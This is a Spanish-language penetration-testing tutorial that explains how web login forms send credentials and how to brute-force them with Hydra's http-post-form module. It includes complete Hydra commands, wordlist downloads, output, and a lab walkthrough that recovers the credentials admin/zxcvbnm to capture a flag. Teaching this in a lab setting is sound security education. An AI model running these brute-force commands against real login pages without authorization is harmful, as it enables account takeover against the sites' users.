
# Formularios de Login

Más allá de la autenticación HTTP básica, muchas aplicaciones web emplean formularios de inicio de sesión personalizados como mecanismo principal de autenticación. Estos formularios, aunque visualmente diversos, suelen compartir mecanismos subyacentes comunes que los convierten en blanco de ataques de fuerza bruta.

## <mark style="color:purple;">Comprender los formularios de inicio de sesión</mark>

Aunque los formularios de inicio de sesión pueden parecer simples campos que solicitan su nombre de usuario y contraseña, representan una compleja interacción de tecnologías del lado del cliente y del servidor. En esencia, los formularios de inicio de sesión son formularios HTML integrados en una página web. Estos formularios suelen incluir campos de entrada (`<input>`) para ingresar el nombre de usuario y la contraseña, junto con un botón de envío (`<button>` o `<input type="submit">`) para iniciar el proceso de autenticación.

### Ejemplo de formulario de inicio de sesión básico

La mayoría de los formularios de inicio de sesión siguen una estructura similar. A continuación, un ejemplo:

```html
<form action="/login" method="post">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username"><br><br>
  <label for="password">Password:</label>
  <input type="password" id="password" name="password"><br><br>
  <input type="submit" value="Submit">
</form>
```

Este formulario, cuando se envía, envía una solicitud POST al endpoint `/login` en el servidor, incluido el nombre de usuario y la contraseña ingresados ​​como datos del formulario.

```http
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```

* El método `POST` indica que se están enviando datos al servidor para crear o actualizar un recurso.
* `/login`: Es el endpoint que maneja la solicitud de inicio de sesión.
* El encabezado `Content-Type` especifica cómo se codifican los datos en el cuerpo de la solicitud.
* El encabezado `Content-Length` indica el tamaño de los datos que se envían.
* El cuerpo de la solicitud contiene el nombre de usuario y la contraseña, codificados como pares clave-valor.

Cuando un usuario interactúa con un formulario de inicio de sesión, su navegador gestiona el procesamiento inicial. El navegador captura las credenciales introducidas, a menudo empleando JavaScript para la validación del lado del cliente o la limpieza de la entrada. Tras el envío, el navegador crea una solicitud HTTP POST. Esta solicitud encapsula los datos del formulario, incluidos el nombre de usuario y la contraseña, en su cuerpo, a menudo codificado como `application/x-www-form-urlencoded`o `multipart/form-data`.

### HTTP Post Form

El servicio de Hydra `http-post-form` está diseñado específicamente para atacar formularios de inicio de sesión. Permite la automatización de solicitudes POST, insertando dinámicamente combinaciones de nombre de usuario y contraseña en el cuerpo de la solicitud. Al aprovechar las capacidades de Hydra, los atacantes pueden probar eficientemente numerosas combinaciones de credenciales en un formulario de inicio de sesión, lo que podría revelar inicios de sesión válidos.

La estructura general de un comando Hydra `http-post-form` se ve así:

```shell-session
afsh4ck@kali$ hydra [opciones] target http-post-form "path:params:condition_string"
```

#### Comprensión de la cadena de condición

En el módulo de Hydra `http-post-form`, las condiciones de éxito y de fallo son cruciales para identificar correctamente los intentos de inicio de sesión válidos e inválidos. Hydra se basa principalmente en las condiciones de fallo (`F=...`) para determinar cuándo un intento de inicio de sesión ha fallado, pero también se puede especificar una condición de éxito (`S=...`) para indicar cuándo un inicio de sesión es exitoso.

La condición de error (`F=...`) se utiliza para comprobar si hay una cadena específica en la respuesta del servidor que indica un intento fallido de inicio de sesión. Este es el enfoque más común, ya que muchos sitios web devuelven un mensaje de error (como "Nombre de usuario o contraseña no válidos") cuando falla el inicio de sesión. Por ejemplo, si un formulario de inicio de sesión devuelve el mensaje "Credenciales no válidas" tras un intento fallido, puede configurar Hydra de la siguiente manera:

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

En este caso, Hydra buscará en cada respuesta la cadena "`Invalid credentials`". Si la encuentra, marcará el intento de inicio de sesión como fallido y pasará al siguiente par de nombre de usuario y contraseña. Este método se utiliza habitualmente porque los mensajes de error suelen ser fáciles de identificar.

Sin embargo, a veces no se muestra un mensaje de error claro, sino una condición de éxito específica. Por ejemplo, si la aplicación redirige al usuario tras un inicio de sesión correcto (mediante el código de estado HTTP `302`) o muestra contenido específico (como "Panel de control" o "Bienvenida"), se puede configurar Hydra para que busque dicha condición de éxito mediante `S=`. A continuación, se muestra un ejemplo en el que un inicio de sesión correcto genera una redirección 302:

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

En este caso, Hydra considerará cualquier respuesta que devuelva un código de estado HTTP 302 como un inicio de sesión exitoso. De igual forma, si un inicio de sesión exitoso genera contenido como "Panel de Control" en la página, puede configurar Hydra para que busque esa palabra clave como condición de éxito:

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```

Hydra ahora registrará el inicio de sesión como exitoso si encuentra la palabra "Dashboard" en la respuesta del servidor.

Antes de activar Hydra en un formulario de inicio de sesión, es fundamental recopilar información sobre su funcionamiento interno. Esto implica identificar los parámetros exactos que utiliza el formulario para transmitir el nombre de usuario y la contraseña al servidor.

### Inspección manual

Al acceder a una web de ejemplo, se presenta un formulario de inicio de sesión básico. Con las herramientas de desarrollo del navegador (normalmente haciendo clic derecho y seleccionando "Inspeccionar" o una opción similar), podemos ver el código HTML del formulario. Analicemos sus componentes principales:

```html
<form method="POST">
    <h2>Login</h2>
    <label for="username">Username:</label>
    <input type="text" id="username" name="username">
    <label for="password">Password:</label>
    <input type="password" id="password" name="password">
    <input type="submit" value="Login">
</form>
```

El HTML muestra un formulario de inicio de sesión sencillo. Puntos clave para Hydra:

* `Method`: `POST`- Hydra necesitará enviar solicitudes POST al servidor.
* Campos:
  * `Username`: El campo de entrada nombrado `username` será el objetivo.
  * `Password`: El campo de entrada nombrado `password` será el objetivo.

Con estos detalles, puedes construir el comando Hydra para automatizar el ataque de fuerza bruta contra este formulario de inicio de sesión.

### Herramientas para desarrolladores del navegador

Tras inspeccionar el formulario, abrimos las Herramientas de Desarrollo del navegador (F12) y vamos a la pestaña "Red". Envíamos un intento de inicio de sesión de prueba con las credenciales. Esto nos permitirá ver la solicitud POST enviada al servidor. En la pestaña "`Network`", buscamos la solicitud correspondiente al envío del formulario y revisamos los datos, los encabezados y la respuesta del servidor.

![Formulario de inicio de sesión con error de credenciales no válidas y panel de red que muestra detalles de la solicitud HTTP POST.](https://academy.hackthebox.com/storage/modules/57/devtools.png)

Esta información refuerza aún más la información que necesitaremos para Hydra. Ahora tenemos la confirmación definitiva tanto de la ruta de destino (`/`) como de los nombres de los parámetros ( `username` y `password`).

#### Interceptación de proxy

Para escenarios más complejos, interceptar el tráfico de red con una herramienta de proxy como [Burp Suite](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/web-proxies.md) u OWASP ZAP puede ser invaluable. Configure su navegador para enrutar el tráfico a través del proxy y luego acceda al formulario de inicio de sesión. El proxy capturará la solicitud POST, lo que le permitirá analizar cada componente, incluyendo los parámetros de inicio de sesión precisos y sus valores.

### Construyendo la cadena de parámetros para Hydra

Tras analizar la estructura y el comportamiento del formulario de inicio de sesión, es hora de crear la cadena `params`, un componente fundamental del módulo de ataque de Hydra `http-post-form`. Esta cadena encapsula los datos que se enviarán al servidor con cada intento de inicio de sesión, simulando un envío legítimo del formulario.

La cadena `params` consta de pares clave-valor, de forma similar a cómo se codifican los datos en una solicitud POST. Cada par representa un campo en el formulario de inicio de sesión, con su valor correspondiente.

* `Parámetros del formulario`: Estos son los campos esenciales que contienen el nombre de usuario y la contraseña. Hydra reemplazará dinámicamente los marcadores de posición (`^USER^`y `^PASS^`) dentro de estos parámetros con valores de sus listas de palabras.
* `Campos adicionales`: Si el formulario incluye otros campos o tokens ocultos (p. ej., tokens CSRF), también deben incluirse en la cadena `params`. Estos pueden tener valores estáticos o marcadores de posición dinámicos si sus valores cambian con cada solicitud.
* `Condición de éxito`: Esto define los criterios que Hydra utilizará para identificar un inicio de sesión exitoso. Puede ser un código de estado HTTP (como `S=302` para una redirección) o la presencia o ausencia de texto específico en la respuesta del servidor (por ejemplo, `F=Invalid credentials` o `S=Welcome`).

Apliquemos esto a nuestro escenario. Descubrimos que:

* El formulario envía datos a la ruta raíz (`/`).
* El campo de nombre de usuario se llama `username`.
* El campo de contraseña se llama `password`.
* Se muestra un mensaje de error "`Invalid credentials`" si no se puede iniciar sesión.

Por lo tanto nuestra cadena `params` sería:

```bash
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

* `"/"`: La ruta donde se envía el formulario.
* `username=^USER^&password=^PASS^`: Los parámetros de formulario con marcadores de posición para Hydra.
* `F=Invalid credentials`: La condición de error: Hydra considerará que un intento de inicio de sesión no fue exitoso si ve esta cadena en la respuesta.

Usaremos [top-usernames-shortlist.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) para la lista de nombres de usuario y [2023-200\_most\_used\_passwords.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt) para la lista de contraseñas.

Esta cadena `params` se incorpora al comando Hydra de la siguiente manera. Hydra sustituirá sistemáticamente " `^USER^` y `^PASS^`" con valores de sus wordlists, enviando solicitudes POST al objetivo y analizando las respuestas para la condición de error especificada. Si un intento de inicio de sesión no muestra el mensaje "`Invalid credentials`", Hydra lo marcará como un posible éxito, revelando las credenciales válidas.

```bash
# Descargar wordlists si se necesitan
afsh4ck@kali$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
afsh4ck@kali$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt

# Comando de Hydra
afsh4ck@kali$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 12:51:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
[DATA] attacking http-post-form://IP:PORT/:username=^USER^&password=^PASS^:F=Invalid credentials
[5000][http-post-form] host: IP   login: ...   password: ...
[STATUS] attack finished for IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 12:51:28
```

Recuerda que crear la cadena `params` correcta es crucial para un ataque Hydra exitoso. Obtener información precisa sobre la estructura y el comportamiento del formulario es esencial para construir esta cadena eficazmente. Una vez que Hydra haya completado el ataque, iniciamos sesión en el sitio web con las credenciales encontradas y recuperamos la flag.

***

## <mark style="color:purple;">Caso práctico</mark>

Después de realizar un ataque de fuerza bruta con éxito y luego iniciar sesión en el objetivo, ¿cuál es la flag completa que encuentra?

```
Objetivo: 83.136.255.10:30745
```

<figure><img src="/files/7iBzaNnmKWin8gBJSPQ9" alt=""><figcaption></figcaption></figure>

#### Bruteforce con hydra

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f -s 30745 83.136.255.10 http-post-form "/:username=^USER^&#x26;password=^PASS^:F=Invalid credentials"
</strong>
Hydra v9.4 (c) 2022 by van Hauser/THC &#x26; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-21 10:08:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
[DATA] attacking http-post-form://83.136.255.10:30745/:username=^USER^&#x26;password=^PASS^:F=Invalid credentials
[30745][http-post-form] host: 83.136.255.10   login: admin   password: zxcvbnm
[STATUS] attack finished for 83.136.255.10 (valid pair found)
</code></pre>

Tenemos un login válido. Vamos a loguearnos para obtener la flag:

<figure><img src="/files/05agSe0svBt640WPhGN3" alt=""><figcaption></figcaption></figure>
